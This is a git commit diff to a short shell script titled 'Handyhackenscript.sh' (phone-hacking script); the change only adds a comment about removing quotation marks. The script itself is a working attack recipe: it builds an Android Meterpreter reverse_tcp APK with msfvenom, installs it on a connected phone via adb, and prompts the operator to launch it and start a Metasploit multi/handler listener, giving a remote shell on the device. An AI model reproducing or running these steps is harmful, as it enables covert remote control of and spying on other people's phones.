53ce1edad2187d30a74f334ab21b4086dfff3b6f
hendr5k <hendrik.schmitz03.hs@gmail.com>
2018-01-13 11:39:08 +0100

    Update Handyhackenscript.sh

--- Handyhackenscript.sh
+++ Handyhackenscript.sh
@@ -1,5 +1,5 @@
 adb devices
-msfvenom -p android/meterpreter/reverse_tcp lhost="your ip"  lport="port" R >/root/hackhandy.apk
+msfvenom -p android/meterpreter/reverse_tcp lhost="your ip"  lport="port" R >/root/hackhandy.apk # remove clasps
 adb install /root/hackhandy.apk
 echo Open MainActivity
 echo multi/handler
